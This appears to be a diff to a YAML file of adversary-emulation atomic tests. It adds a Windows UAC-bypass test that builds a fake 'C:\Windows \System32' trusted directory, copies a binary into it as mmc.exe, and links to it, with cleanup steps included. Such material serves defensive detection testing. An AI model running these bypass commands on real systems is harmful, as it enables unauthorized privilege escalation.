@@ -116,3 +116,27 @@ atomic_tests:
       Start-Process "C:\Windows\System32\ComputerDefaults.exe"
     cleanup_command: |
       Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
+
+- name: Bypass UAC by Mocking Trusted Directories
+  description: |
+    Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems, however the directory structure will be created.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      mkdir "\\?\C:\Windows \System32\"
+      copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+      mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+    cleanup_command: |
+      rd "\\?\C:\Windows \" /S /Q
+      del "c:\testbypass.exe"
